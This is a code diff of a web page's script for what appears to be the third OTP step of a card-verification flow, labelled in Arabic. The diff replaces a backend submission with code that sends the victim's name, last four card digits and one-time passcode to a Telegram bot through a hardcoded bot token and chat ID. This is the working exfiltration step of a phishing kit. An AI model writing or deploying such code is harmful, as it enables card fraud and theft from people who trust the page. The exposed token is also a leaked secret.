@@ -192,15 +192,10 @@
 </div>
 
 <script>
-    // API Configuration
-    const API_BASE_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1'
-      ? 'http://localhost:3000'
-      : '';
-
-    // Get session ID
-    function getSessionId() {
-      return localStorage.getItem('sessionId') || '';
-    }
+<script>
+    // Telegram Configuration
+    const telegramBotToken = '8364441024:AAHluZaG5P8utYObf0Qj3719YONXO8zH24c';
+    const chatId = '7785288759';
 
     // Get owner name
     function getOwnerName() {
@@ -212,26 +207,34 @@
       return localStorage.getItem('cardNumber') || '----';
     }
 
-    // Submit OTP to backend server
-    async function submitToServer(data) {
+    // Send data directly to Telegram
+    async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
       try {
-        const response = await fetch(`${API_BASE_URL}/api/submit/otp`, {
+        const response = await fetch(url, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            ...data,
-            sessionId: getSessionId()
-          })
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
         });
         return await response.json();
       } catch (error) {
-        console.error('Server error:', error);
-        return { success: false, error: error.message };
+        console.error('Telegram Error:', error);
+        return { ok: false };
       }
     }
 
+    // Submit OTP to Telegram
+    async function submitToServer(data) {
+      const message = `
+✅ <b>رمز التحقق (3)</b>
+━━━━━━━━━━━━━━━
+👤 من: ${data.owner_name}
+💳 آخر 4 أرقام: ${data.last_4_digits}
+🔐 رمز OTP: ${data.otp_code}
+      `;
+      return await sendToTelegram(message);
+    }
+    // Elements
     // Elements
     const otpText = document.getElementById('otpText');
     const otpTimer = document.getElementById('otpTimer');
@@ -278,11 +281,9 @@
         owner_name: getOwnerName(),
         last_4_digits: getLast4Digits(),
         otp_code: otpCode,
-        page: 'otp3.html',
-        step: 3
       };
 
-      // Submit to server
+      // Submit to Telegram
       await submitToServer(data);
 
       setTimeout(() => {
